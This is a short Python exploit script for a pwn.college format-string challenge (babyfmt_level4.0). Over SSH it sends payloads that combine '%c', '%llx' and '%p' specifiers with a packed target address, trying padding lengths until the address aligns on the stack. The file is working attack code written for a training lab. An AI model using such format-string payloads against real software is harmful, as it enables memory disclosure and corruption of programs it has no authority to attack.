import subprocess
import struct

ADDR = 0x404100
SSH = ["ssh","-i","../key","hacker@dojo.pwn.college","/challenge/babyfmt_level4.0"]
tail = "%p " * 40
idx = 52
for pad in range(8):
    fmt = f"AAA |%1$143c%{idx}$llx DONE {tail}"
    payload = fmt.encode() + b"B" * pad + struct.pack("<Q", ADDR)
    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")
    line = None
    for l in out.splitlines():
        if l.startswith("AAA "):
            line = l
            break
    print("pad", pad, "line:", line)
